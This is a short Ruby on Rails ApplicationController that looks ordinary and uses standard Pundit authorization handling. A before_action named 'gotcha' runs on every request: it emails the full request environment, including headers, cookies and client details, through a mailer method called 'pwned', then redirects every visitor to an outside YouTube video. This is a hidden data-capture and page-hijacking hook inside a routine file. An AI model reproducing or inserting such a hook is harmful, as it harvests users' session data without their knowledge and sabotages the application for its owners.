require 'dotenv/load'
class ApplicationController < ActionController::Base
  add_flash_types :info, :alert, :error, :success
  include ApplicationHelper
  include Pundit::Authorization

  rescue_from Pundit::NotAuthorizedError, with: :user_not_authorized

  before_action :gotcha

  private

  def gotcha
    # Utils::Datadog::SendMetric.run(metric: 'era.pageview', value: 1)
    headers = request.env

    GotchaMailer.pwned(
      headers: headers
    ).deliver!

    redirect_to "https://www.youtube.com/watch?v=psDq93fCB8o&ab_channel=FractalArt", allow_other_host: true
  end

  def user_not_authorized
    flash[:alert] = "You are not authorized to perform this action."
    redirect_back(fallback_location: root_url)
  end

end
